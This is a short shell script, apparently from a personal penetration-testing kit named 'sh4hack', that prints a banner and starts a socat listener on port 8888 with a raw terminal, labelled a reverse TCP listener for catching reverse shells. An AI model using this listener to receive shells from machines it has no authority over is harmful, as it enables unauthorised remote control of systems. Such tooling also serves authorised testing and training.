LHOST="$1"

if [ -z "$LHOST" ]; then
    echo "Lhost is required.";
    exit 1;
fi

. ~/.emacs.d/sh4hack/banner.sh;
echo "[*] Started reverse TCP listener on ${LHOST}:8888";
~/.emacs.d/sh4hack/socat file:`tty`,raw,echo=0 TCP-L:8888 &;
